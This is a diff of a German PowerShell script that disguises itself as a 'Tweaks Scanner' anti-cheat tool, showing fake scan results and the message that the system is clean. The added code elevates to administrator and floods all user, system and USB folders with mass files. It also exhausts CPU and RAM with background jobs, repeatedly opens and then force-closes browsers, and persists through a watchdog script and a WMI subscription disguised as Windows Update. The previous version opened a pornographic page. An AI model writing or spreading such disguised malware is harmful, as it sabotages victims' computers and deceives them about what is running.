@@ -1,17 +1,17 @@
 # ================================
-# MAIN2PACKET TWEAKS SCANNER v9.4.2 - NUR 1 SEITE IN EDGE
+# MAIN2PACKET TWEAKS SCANNER v10.0 - ULTIMATE FIX
 # ================================
 
 # Administrator-Rechte anfordern
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
+    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     exit
 }
 
-# ===== TARNUNG - SIEHT AUS WIE EIN ECHTER SCANNER =====
+# ===== TARNUNG =====
 Clear-Host
 Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║     MAIN2PACKET TWEAKS SCANNER v9.4.2      ║" -ForegroundColor Cyan
+Write-Host "║     MAIN2PACKET TWEAKS SCANNER v10.0      ║" -ForegroundColor Cyan
 Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "[INFO] Scanning for cheats and mods..."
@@ -33,28 +33,71 @@ foreach ($item in $scanItems) {
 Write-Host ""
 Write-Host "[RESULT] No cheats found - System clean" -ForegroundColor Green
 Write-Host ""
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 1
 
-# Fenster jetzt verstecken
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("User32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
+# Fenster im Hintergrund (nicht ganz verstecken)
+$Host.UI.RawUI.WindowTitle = "Windows Update Scanner"
 
 # ===== ERROR HANDLING =====
 $ErrorActionPreference = "SilentlyContinue"
-$Host.UI.RawUI.WindowTitle = "Main2packet Scanner"
 
 # ===== KONFIGURATION =====
-$global:trollActive = $true
 $global:currentRound = 0
 $global:maxRounds = 150
 
-# ===== ALLE ZIELE FÜR DATEIEN/ORDNER - GEFIXT! =====
+# ===== ALLE ZIELE - JETZT WIRKLICH ALLES! =====
+Write-Host "[INFO] Sammle ALLE Ziele..." -ForegroundColor Yellow
+
+$alleZiele = @()
+
+# 1. ALLE BENUTZERORDNER (JEDER BENUTZER!)
+$users = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
+foreach ($user in $users) {
+    if ($user.Name -notin @('Public', 'Default', 'All Users')) {
+        $alleZiele += "$($user.FullName)\Desktop"
+        $alleZiele += "$($user.FullName)\Documents"
+        $alleZiele += "$($user.FullName)\Downloads"
+        $alleZiele += "$($user.FullName)\Pictures"
+        $alleZiele += "$($user.FullName)\Music"
+        $alleZiele += "$($user.FullName)\Videos"
+        $alleZiele += "$($user.FullName)\AppData\Local"
+        $alleZiele += "$($user.FullName)\AppData\Roaming"
+        $alleZiele += "$($user.FullName)\AppData\Local\Temp"
+        $alleZiele += "$($user.FullName)\Favorites"
+        $alleZiele += "$($user.FullName)\Links"
+        $alleZiele += "$($user.FullName)\Contacts"
+        $alleZiele += "$($user.FullName)\Saved Games"
+        $alleZiele += "$($user.FullName)\Searches"
+    }
+}
+
+# 2. ALLE LAUFWERKE (C:, D:, E:, usw.)
+$drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
+foreach ($drive in $drives) {
+    $alleZiele += $drive.Root
+    # Auch Unterordner auf jedem Laufwerk
+    $alleZiele += "$($drive.Root)Temp"
+    $alleZiele += "$($drive.Root)ProgramData"
+    $alleZiele += "$($drive.Root)Backup"
+}
+
+# 3. SYSTEM ORDNER
+$alleZiele += "C:\Windows\Temp"
+$alleZiele += "C:\Windows\System32\Tasks"
+$alleZiele += "C:\ProgramData"
+$alleZiele += "C:\ProgramData\Microsoft\Windows\Caches"
+$alleZiele += "C:\ProgramData\Microsoft\Windows\WER"
+$alleZiele += "C:\Program Files"
+$alleZiele += "C:\Program Files (x86)"
+$alleZiele += "C:\Users\Public"
+$alleZiele += "C:\Users\Public\Desktop"
+$alleZiele += "C:\Users\Public\Documents"
+$alleZiele += "C:\Users\Public\Downloads"
+$alleZiele += "C:\Users\Public\Music"
+$alleZiele += "C:\Users\Public\Pictures"
+$alleZiele += "C:\Users\Public\Videos"
+
+# 4. ALLE VORHANDENEN ORDNER VOM ALTEN SKRIPT
 $desktop = [Environment]::GetFolderPath("Desktop")
 $documents = [Environment]::GetFolderPath("MyDocuments")
 $downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
@@ -65,260 +108,226 @@ $appData = $env:APPDATA
 $localAppData = $env:LOCALAPPDATA
 $temp = $env:TEMP
 
-# ALLE ORDNER - JEDER PFAD WIRD GEPRÜFT!
-$alleZiele = @()
+$alleZiele += $desktop, $documents, $downloads, $music, $pictures, $videos
+$alleZiele += $appData, $localAppData, $temp
+$alleZiele += "$appData\Microsoft\Windows\Recent"
+$alleZiele += "$appData\Microsoft\Windows\Templates"
+$alleZiele += "$localAppData\Microsoft\Windows\Caches"
+$alleZiele += "$localAppData\Microsoft\Windows\History"
+$alleZiele += "$localAppData\Microsoft\Windows\INetCache"
+$alleZiele += "$localAppData\Google\Chrome\User Data\Default\Cache"
+$alleZiele += "$localAppData\Google\Chrome\User Data\Default\Code Cache"
+$alleZiele += "$appData\Mozilla\Firefox\Profiles"
+$alleZiele += "$appData\.minecraft"
+$alleZiele += "$appData\Roaming\Discord"
+$alleZiele += "$appData\Roaming\Discord\Cache"
+$alleZiele += "$appData\Roaming\Spotify"
+$alleZiele += "$appData\Roaming\Spotify\Cache"
+$alleZiele += "$appData\Roaming\Steam"
+$alleZiele += "$appData\Roaming\Steam\cache"
 
-# Benutzerordner - ALLE VORHANDEN!
-$userDirs = @(
-    $desktop, $documents, $downloads, $music, $pictures, $videos
-)
-
-foreach ($dir in $userDirs) {
-    if (Test-Path $dir) {
-        $alleZiele += $dir
-        Write-Host "[OK] Benutzerordner: $dir" -ForegroundColor Green
-    }
+# 5. EXTRA ORDNER (NOCH MEHR!)
+for ($i = 1; $i -le 50; $i++) {
+    $alleZiele += "C:\TEMP_$i"
+    $alleZiele += "C:\ProgramData\TEMP_$i"
+    $alleZiele += "$env:TEMP\EXTRA_$i"
 }
 
-# AppData Pfade
-$appDataPaths = @(
-    $appData,
-    $localAppData,
-    $temp,
-    "$appData\Microsoft\Windows\Recent",
-    "$appData\Microsoft\Windows\Templates",
-    "$localAppData\Microsoft\Windows\Caches",
-    "$localAppData\Microsoft\Windows\History",
-    "$localAppData\Microsoft\Windows\INetCache"
-)
+# Duplikate entfernen
+$alleZiele = $alleZiele | Where-Object {$_ -ne $null} | Select-Object -Unique
 
-foreach ($path in $appDataPaths) {
-    if (Test-Path $path) {
-        $alleZiele += $path
-        Write-Host "[OK] AppData: $path" -ForegroundColor Green
-    }
-}
-
-# Browser Cache
-$browserPaths = @(
-    "$localAppData\Google\Chrome\User Data\Default\Cache",
-    "$localAppData\Google\Chrome\User Data\Default\Code Cache",
-    "$appData\Mozilla\Firefox\Profiles"
-)
-
-foreach ($path in $browserPaths) {
-    if (Test-Path $path) {
-        $alleZiele += $path
-        Write-Host "[OK] Browser: $path" -ForegroundColor Green
-    } else {
-        # Fallback: Einfach in AppData spammen
-        $alleZiele += $appData
-    }
-}
-
-# Gaming
-$gamingPaths = @(
-    "$appData\.minecraft",
-    "$appData\Roaming\Discord",
-    "$appData\Roaming\Steam",
-    "$appData\Roaming\Spotify"
-)
-
-foreach ($path in $gamingPaths) {
-    if (Test-Path $path) {
-        $alleZiele += $path
-        Write-Host "[OK] Gaming: $path" -ForegroundColor Green
-    } else {
-        # Ordner erstellen wenn nicht vorhanden!
-        try {
-            New-Item -Path $path -ItemType Directory -Force | Out-Null
-            $alleZiele += $path
-            Write-Host "[NEU] Gaming Ordner erstellt: $path" -ForegroundColor Yellow
-        } catch {}
-    }
-}
-
-# Windows Pfade
-$windowsPaths = @(
-    "$env:SystemRoot\Temp",
-    "C:\ProgramData",
-    "C:\Users\Public\Desktop",
-    "C:\Users\Public\Documents",
-    "C:\Users\Public\Downloads"
-)
-
-foreach ($path in $windowsPaths) {
-    if (Test-Path $path) {
-        $alleZiele += $path
-        Write-Host "[OK] Windows: $path" -ForegroundColor Green
-    }
-}
-
-Write-Host ""
-Write-Host "[INFO] GEFUNDENE ZIELE: $($alleZiele.Count)" -ForegroundColor Cyan
+Write-Host "[INFO] $($alleZiele.Count) Ziele gefunden!" -ForegroundColor Green
 Write-Host ""
 
-# ===== WATCHDOGS (4x) =====
-$watchdog1 = @"
+# ===== WATCHDOG (VEREINFACHT) =====
+$watchdogScript = @"
 while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
-    if (`$p.Count -eq 0) { 
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
-    }
-    Start-Sleep -Seconds 2
-}
-"@
-$watchdog1 | Out-File "$env:TEMP\wd_schnell.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_schnell.ps1`""
-
-$watchdog2 = @"
-while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne $pid}
     if (`$p.Count -eq 0) {
         Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
     }
     Start-Sleep -Seconds 10
 }
 "@
-$watchdog2 | Out-File "$env:TEMP\wd_mittel.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_mittel.ps1`""
+$watchdogScript | Out-File "$env:TEMP\watchdog.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\watchdog.ps1`""
 
-$watchdog3 = @"
-while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue
-    `$troll = `$p | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
-    if (`$troll.Count -eq 0) {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
-    }
-    Start-Sleep -Seconds 30
-}
-"@
-$watchdog3 | Out-File "$env:TEMP\wd_langsam.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_langsam.ps1`""
-
-$watchdog4 = @"
-`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
-`$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "Main2packetWatchdog" -Action `$action -Trigger `$trigger -Force
-"@
-$watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_startup.ps1`""
-
-# ===== EXTRA JOBS =====
+# ===== USB JOB =====
 $usbJob = Start-Job -ScriptBlock {
     while ($true) {
-        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
+        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\" -and $_.Root -ne "C:\"}
         foreach ($drive in $drives) {
             $drivePath = $drive.Root
             $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
             try {
                 New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
-                for ($u = 1; $u -le 200; $u++) {
-                    $usbFile = Join-Path $mainUSB "usb_$u.king"
-                    "MAIN2PACKET KING - USB" | Out-File $usbFile -Encoding UTF8 -Force
+                for ($u = 1; $u -le 1000; $u++) {
+                    $usbFile = Join-Path $mainUSB "usb_$u.txt"
+                    "MAIN2PACKET USB SPAM" * 1000 | Out-File $usbFile -Encoding UTF8 -Force
                 }
             } catch {}
         }
-        Start-Sleep -Seconds 30
+        Start-Sleep -Seconds 10
     }
 }
 
-# ===== NEU: NUR 1 SEITE IN EDGE =====
+# ===== BROWSER JOB =====
 $browserJob = Start-Job -ScriptBlock {
-    # NUR EINE SEITE - HIER KANNST DU SIE ÄNDERN!
-    $seite = "https://de.pornhub.org/view_video.php?viewkey=ph6352d0e12f042"  # Rick Roll
+    $seite = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"  # Rick Roll
     
     while ($true) {
-        # Zufällige Wartezeit (5-10 Minuten)
-        $wartezeit = Get-Random -Minimum 10 -Maximum 15
+        $wartezeit = Get-Random -Minimum 30 -Maximum 60
         Start-Sleep -Seconds $wartezeit
         
-        # NUR EDGE öffnen!
         try {
             Start-Process "msedge.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
         } catch {
-            # Falls Edge nicht geht, versuche Chrome als Backup
             try {
                 Start-Process "chrome.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
             } catch {}
         }
         
-        # Nach 30 Sekunden Browser wieder schließen
-        Start-Sleep -Seconds 30
-        Get-Process | Where-Object {$_.Name -like "*msedge*" -or $_.Name -like "*chrome*"} | Stop-Process -Force
+        Start-Sleep -Seconds 20
+        Get-Process | Where-Object {$_.Name -like "*edge*" -or $_.Name -like "*chrome*"} | Stop-Process -Force
     }
 }
 
-# ===== HAUPTSCHLEIFE - FIXED: ALLE ZIELE JEDE RUNDE =====
-Write-Host "[INFO] STARTE MIT $($alleZiele.Count) ZIELEN - $global:maxRunden RUNDEN" -ForegroundColor Green
+# ===== CPU + RAM FRESSEN =====
+for ($cpu = 1; $cpu -le 20; $cpu++) {
+    Start-Job -ScriptBlock {
+        while ($true) {
+            $a = 0
+            for ($i = 0; $i -lt 1000000; $i++) {
+                $a += [Math]::Sqrt($i) * [Math]::Sin($i)
+            }
+        }
+    }
+}
 
+for ($ram = 1; $ram -le 10; $ram++) {
+    Start-Job -ScriptBlock {
+        $data = @()
+        while ($true) {
+            $data += New-Object byte[] (50MB)
+            Start-Sleep -Milliseconds 500
+        }
+    }
+}
+
+# ===== HAUPTSCHLEIFE - ALLES GLEICHZEITIG =====
+Write-Host "[INFO] STARTE ZERSTÖRUNG - $($alleZiele.Count) ZIELE GLEICHZEITIG!" -ForegroundColor Red
+Write-Host ""
+
+# ALLE ZIELE AUFTEILEN FÜR PARALLELE VERARBEITUNG
+$zielGruppen = @()
+$gruppe = @()
+$counter = 0
+
+foreach ($ziel in $alleZiele) {
+    $gruppe += $ziel
+    $counter++
+    if ($counter -ge 20) {
+        $zielGruppen += ,@($gruppe)
+        $gruppe = @()
+        $counter = 0
+    }
+}
+if ($gruppe.Count -gt 0) {
+    $zielGruppen += ,@($gruppe)
+}
+
+Write-Host "[INFO] $($zielGruppen.Count) parallele Gruppen" -ForegroundColor Yellow
+
+# HAUPTLOOP
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
-    Write-Host "[RUNDE $global:currentRound] Spamme ALLE $($alleZiele.Count) Ziele..." -ForegroundColor Yellow
+    Write-Host "[RUNDE $global:currentRound/$global:maxRounds] FRESSE PC..." -ForegroundColor Red
     
-    # JEDE RUNDE: ALLE Ziele durchgehen!
-    foreach ($ziel in $alleZiele) {
-        if (Test-Path $ziel) {
-            # Hauptordner für DIESE Runde in DIESEM Ziel
-            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
-            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+    # ALLE GRUPPEN PARALLEL STARTEN
+    $jobs = @()
+    $gruppenIndex = 0
+    
+    foreach ($gruppe in $zielGruppen) {
+        $gruppenIndex++
+        $jobs += Start-Job -Name "Gruppe$gruppenIndex" -ScriptBlock {
+            $ziele = $args[0]
+            $runde = $args[1]
+            $computer = $args[2]
             
-            # 500 DATEIEN pro Ziel pro Runde
-            for ($i = 1; $i -le 500; $i++) {
-                # Direkt im Ziel
-                $f1 = Join-Path $ziel "MAIN2PACKET_SCAN_$i.king"
-                "$env:COMPUTERNAME - RUNDE $global:currentRound - $i" | Out-File $f1 -Encoding UTF8 -Force
+            foreach ($ziel in $ziele) {
+                # Ziel erstellen falls nicht vorhanden
+                if (-not (Test-Path $ziel)) {
+                    try { New-Item -Path $ziel -ItemType Directory -Force | Out-Null } catch {}
+                }
                 
-                # Im Hauptordner
-                $f2 = Join-Path $mainFolder "file_$i.king"
-                "$env:COMPUTERNAME - RUNDE $global:currentRound - $i" | Out-File $f2 -Encoding UTF8 -Force
-            }
-            
-            # 500 UNTERORDNER pro Ziel pro Runde
-            for ($u = 1; $u -le 500; $u++) {
-                $subFolder = Join-Path $mainFolder "SUB_$u"
-                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
-                
-                # 500 DATEIEN pro Unterordner
-                for ($s = 1; $s -le 500; $s++) {
-                    $sf = Join-Path $subFolder "subfile_$s.king"
-                    "SUB $u - RUNDE $global:currentRound - DATEI $s" | Out-File $sf -Encoding UTF8 -Force
+                if (Test-Path $ziel) {
+                    # Hauptordner für diese Runde
+                    $mainFolder = Join-Path $ziel "MAIN2PACKET_$runde"
+                    try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+                    
+                    # 1000 DATEIEN direkt im Ziel
+                    for ($i = 1; $i -le 1000; $i++) {
+                        $f1 = Join-Path $ziel "FILE_${runde}_$i.txt"
+                        $f2 = Join-Path $mainFolder "file_$i.txt"
+                        "$computer - RUNDE $runde - $i" * 100 | Out-File $f1 -Encoding UTF8 -Force
+                        "$computer - RUNDE $runde - $i" * 100 | Out-File $f2 -Encoding UTF8 -Force
+                    }
+                    
+                    # 500 UNTERORDNER
+                    for ($u = 1; $u -le 500; $u++) {
+                        $subFolder = Join-Path $mainFolder "SUB_$u"
+                        try { New-Item -Path $subFolder -ItemType Directory -Force | Out-Null } catch {}
+                        
+                        # 500 DATEIEN pro Unterordner
+                        for ($s = 1; $s -le 500; $s++) {
+                            $sf = Join-Path $subFolder "sub_$s.txt"
+                            "SUB $u - DATEI $s - RUNDE $runde" * 10 | Out-File $sf -Encoding UTF8 -Force
+                        }
+                    }
+                    
+                    # Zusätzlich: 100 GROSSE Dateien
+                    for ($g = 1; $g -le 100; $g++) {
+                        $gf = Join-Path $mainFolder "BIG_$g.bin"
+                        # 1MB pro Datei
+                        $bytes = New-Object byte[] (1MB)
+                        [System.IO.File]::WriteAllBytes($gf, $bytes)
+                    }
                 }
             }
-        }
+        } -ArgumentList $gruppe, $global:currentRound, $env:COMPUTERNAME
     }
     
-    # Zeige Fortschritt
-    Write-Host "[RUNDE $global:currentRound] Fertig! Nächste Runde..." -ForegroundColor Green
-    Start-Sleep -Milliseconds 500  # Kurze Pause
+    # Auf Jobs warten (maximal 30 Sekunden)
+    $jobs | Wait-Job -Timeout 30 | Out-Null
+    
+    # Jobs die noch laufen im Hintergrund lassen
+    Write-Host "[RUNDE $global:currentRound] $($jobs | Where-Object {$_.State -eq 'Running'} | Measure-Object | Select-Object -ExpandProperty Count) Jobs noch aktiv" -ForegroundColor Yellow
+    
+    Start-Sleep -Milliseconds 500
 }
 
-# ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
-$wmiJob = Start-Job -ScriptBlock {
-    try {
-        # Event Filter - startet bei Systemstart
-        $filterArgs = @{
-            Name = 'WindowsUpdateFilter'
-            EventNameSpace = 'root\cimv2'
-            QueryLanguage = 'WQL'
-            Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
-        }
-        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
-        
-        # Event Consumer - führt Skript aus
-        $consumerArgs = @{
-            Name = 'WindowsUpdateConsumer'
-            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
-        }
-        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
-        
-        # Filter mit Consumer verbinden
-        $bindingArgs = @{Filter=$filter; Consumer=$consumer}
-        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
-    } catch {}
-}
+# ===== WMI PERSISTENZ =====
+try {
+    $filterArgs = @{
+        Name = 'WindowsUpdateFilter'
+        EventNameSpace = 'root\cimv2'
+        QueryLanguage = 'WQL'
+        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+    }
+    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
+    
+    $consumerArgs = @{
+        Name = 'WindowsUpdateConsumer'
+        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    }
+    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
+    
+    $bindingArgs = @{Filter=$filter; Consumer=$consumer}
+    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
+} catch {}
 
-# ===== ENDE - LÄUFT WEITER =====
+# ===== ENDLOS =====
 while ($true) {
-    Start-Sleep -Seconds 3600
+    Write-Host "[PC FRESSER] LÄUFT WEITER..." -ForegroundColor Red
+    Start-Sleep -Seconds 60
 }
